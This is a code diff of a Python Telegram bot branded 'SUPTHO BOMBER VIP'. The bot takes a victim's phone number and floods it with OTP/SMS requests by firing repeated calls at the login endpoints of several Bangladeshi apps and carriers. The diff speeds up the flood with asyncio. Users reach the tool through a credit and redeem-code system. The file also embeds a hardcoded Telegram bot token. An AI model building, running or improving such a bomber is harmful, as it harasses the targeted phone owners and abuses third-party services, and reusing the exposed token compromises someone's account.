@@ -1,12 +1,12 @@
 import telebot
-import requests
+import asyncio
+import aiohttp
 import threading
 import time
 import os
 import json
 import random
 import string
-from concurrent.futures import ThreadPoolExecutor
 from flask import Flask
 from telebot import types
 
@@ -15,21 +15,20 @@ from telebot import types
 # ==========================================
 app = Flask('')
 @app.route('/')
-def home(): return "Turbo Bot is Running!"
+def home(): return "Supreme Turbo Bot is Running!"
 
 def run_web_server():
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
 
 def keep_alive():
-    t = threading.Thread(target=run_web_server, daemon=True)
-    t.start()
+    threading.Thread(target=run_web_server, daemon=True).start()
 
 # ==========================================
-# 🔧 CONFIGURATION (সঠিক তথ্য দিন)
+# 🔧 CONFIGURATION (Sothik ID o Token din)
 # ==========================================
-API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  # <--- Bot Token দিন
-OWNER_ID = 6941003064              # <--- আপনার Numeric ID দিন (UserInfoBot থেকে নিন)
+API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  # <--- Bot Token din
+OWNER_ID = 6941003064              # <--- Apnar numeric ID din
 OWNER_NAME = "Suptho Hpd"
 CHANNEL_ID = "@SH_tricks"         
 DATA_FILE = 'bot_db.json'
@@ -52,17 +51,21 @@ def save_data(data):
 db = load_data()
 
 # ==========================================
-# 🚀 ULTRA FAST API ENGINE
+# 🚀 ASYNC FAST API ENGINE (The Speed Secret)
 # ==========================================
-def api_hit(url, method, data=None, json_data=None):
+async def async_hit(session, url, method, data=None, json_data=None):
     try:
         headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-        if method == "POST": requests.post(url, data=data, json=json_data, headers=headers, timeout=2)
-        else: requests.get(url, headers=headers, timeout=2)
-    except: pass
+        if method == "POST":
+            async with session.post(url, data=data, json=json_data, headers=headers, timeout=3) as resp:
+                return await resp.text()
+        else:
+            async with session.get(url, headers=headers, timeout=3) as resp:
+                return await resp.text()
+    except: return None
 
-def get_all_apis(target):
-    return [
+async def start_async_bombing(target, amount):
+    apis = [
         ("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", None, {"number": "+88"+target}),
         (f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET", None, None),
         (f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET", None, None),
@@ -70,28 +73,28 @@ def get_all_apis(target):
         ("https://shopbasebd.com/store/registration/sendOTP", "POST", {"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"}, None),
         ("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", None, {"mobile": target}),
         ("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", {"msisdn": target}, None),
+        ("https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET", None, None),
         ("https://api.shikho.com/auth/v2/send/sms", "POST", None, {"phone": "88"+target, "type": "student"}),
-        ("https://api.swap.com.bd/api/v1/send-otp", "POST", None, {"phone": target}),
-        (f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET", None, None)
+        ("https://api.ostad.app/api/v2/user/with-otp", "POST", None, {"msisdn": target})
     ]
-
-def attack_executor(target, amount):
-    apis = get_all_apis(target)
-    with ThreadPoolExecutor(max_workers=30) as executor:
+    
+    async with aiohttp.ClientSession() as session:
+        tasks = []
         count = 0
         while count < amount:
             for url, method, data, json_data in apis:
                 if count >= amount: break
-                executor.submit(api_hit, url, method, data, json_data)
+                tasks.append(async_hit(session, url, method, data, json_data))
                 count += 1
+        await asyncio.gather(*tasks)
 
 # ==========================================
-# 🤖 COMMANDS & UI
+# 🤖 BOT COMMANDS (Admin Fixed)
 # ==========================================
-def is_user_joined(user_id):
+def is_joined(user_id):
     try:
-        member = bot.get_chat_member(CHANNEL_ID, user_id)
-        return member.status in ['member', 'administrator', 'creator']
+        res = bot.get_chat_member(CHANNEL_ID, user_id)
+        return res.status in ['member', 'administrator', 'creator']
     except: return False
 
 @bot.message_handler(commands=['start'])
@@ -103,53 +106,44 @@ def welcome(message):
     
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("🚀 Start Bomb", "💳 My Balance", "👥 Refer & Earn", "💰 Redeem Credit")
-    bot.send_message(message.chat.id, f"🔥 **SUPTHO BOMBER VIP** 🔥\nWelcome {message.from_user.first_name}!", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥\nWelcome Master!", reply_markup=markup, parse_mode='Markdown')
 
-# --- ফিক্সড অ্যাডমিন কমান্ডসমূহ ---
+# --- Admin Panel Fixed ---
 @bot.message_handler(commands=['admin', 'gencodes', 'stats'])
-def admin_commands(message):
+def admin_panel(message):
     if message.from_user.id != OWNER_ID:
-        return bot.reply_to(message, "❌ আপনি অ্যাডমিন নন।")
+        return bot.reply_to(message, "❌ Access Denied!")
     
     cmd = message.text.split()
     if cmd[0] == '/admin':
-        text = "👑 **Admin Panel**\n\n`/gencodes 5` - ৫টি কোড বানান\n`/stats` - বটের তথ্য\n`/addcredit ID Amount` - ক্রেডিট দিন"
-        bot.send_message(message.chat.id, text, parse_mode='Markdown')
-    
+        bot.send_message(message.chat.id, "👑 **Admin Commands:**\n`/stats` - User Info\n`/gencodes 10` - Generate Codes", parse_mode='Markdown')
     elif cmd[0] == '/stats':
-        users_count = len(db['users'])
-        codes_count = len(db['codes'])
-        bot.reply_to(message, f"📊 **Bot Stats**\nTotal Users: {users_count}\nActive Codes: {codes_count}", parse_mode='Markdown')
-        
+        bot.reply_to(message, f"📊 Total Users: {len(db['users'])}\n🎟️ Codes: {len(db['codes'])}")
     elif cmd[0] == '/gencodes':
         try:
             num = int(cmd[1])
-            new_codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(num)]
-            db['codes'].extend(new_codes)
-            save_data(db)
-            bot.reply_to(message, f"✅ **{num} Codes Generated:**\n`{', '.join(new_codes)}`", parse_mode='Markdown')
-        except: bot.reply_to(message, "❌ সঠিক ফরম্যাট: `/gencodes 5`")
+            codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
+            db['codes'].extend(codes); save_data(db)
+            bot.reply_to(message, f"✅ Generated:\n`{', '.join(codes)}`", parse_mode='Markdown')
+        except: bot.reply_to(message, "Use: `/gencodes 5`")
 
-# --- বাটন হ্যান্ডলার ---
+# --- Bombing Logic ---
 @bot.message_handler(func=lambda m: True)
-def handle_all(message):
-    uid = str(message.from_user.id)
-    if not is_user_joined(message.from_user.id):
+def handle_buttons(message):
+    if not is_joined(message.from_user.id):
         return bot.reply_to(message, f"❌ Join {CHANNEL_ID} first!")
 
     if message.text == "🚀 Start Bomb":
-        msg = bot.reply_to(message, "💣 ১১ ডিজিটের নাম্বার দিন:")
+        msg = bot.reply_to(message, "💣 Target Number (11 Digit):")
         bot.register_next_step_handler(msg, ask_amount)
     elif message.text == "💳 My Balance":
+        uid = str(message.from_user.id)
         cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
         bot.reply_to(message, f"💰 Balance: {cred} Credits")
-    elif message.text == "💰 Redeem Credit":
-        msg = bot.reply_to(message, "🎁 Redeem Code দিন:")
-        bot.register_next_step_handler(msg, use_redeem)
 
 def ask_amount(message):
     target = message.text.strip()
-    if len(target) != 11: return bot.reply_to(message, "⚠️ Incorrect number.")
+    if len(target) != 11: return bot.reply_to(message, "❌ Invalid Number!")
     msg = bot.reply_to(message, f"🎯 Target: {target}\n🔢 Amount (Max 100):")
     bot.register_next_step_handler(msg, process_bomb, target)
 
@@ -157,23 +151,20 @@ def process_bomb(message, target):
     uid = str(message.from_user.id)
     try:
         amount = int(message.text)
+        if amount > 100: amount = 100
+        
         if int(uid) != OWNER_ID:
             if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credits!")
-            db['users'][uid]['credits'] -= 1
-            save_data(db)
+            db['users'][uid]['credits'] -= 1; save_data(db)
         
-        bot.send_message(message.chat.id, f"🚀 **Attack Started!**\nTarget: {target}")
-        attack_executor(target, amount)
-        bot.send_message(message.chat.id, f"✅ **Finished!** Sent: {amount}")
+        bot.send_message(message.chat.id, f"🚀 **Async Bombing Started!**\nTarget: {target}")
+        
+        # Async loop running in a thread
+        loop = asyncio.new_event_loop()
+        threading.Thread(target=lambda: loop.run_until_complete(start_async_bombing(target, amount))).start()
+        
+        bot.send_message(message.chat.id, f"✅ **Attack Finished!** Sent: {amount}")
     except: bot.reply_to(message, "❌ Error.")
-
-def use_redeem(message):
-    code = message.text.strip()
-    if code in db['codes']:
-        db['codes'].remove(code)
-        db['users'][str(message.from_user.id)]['credits'] += 5
-        save_data(db); bot.reply_to(message, "✅ +5 Credits Added!")
-    else: bot.reply_to(message, "❌ Invalid.")
 
 if __name__ == "__main__":
     try: bot.remove_webhook()
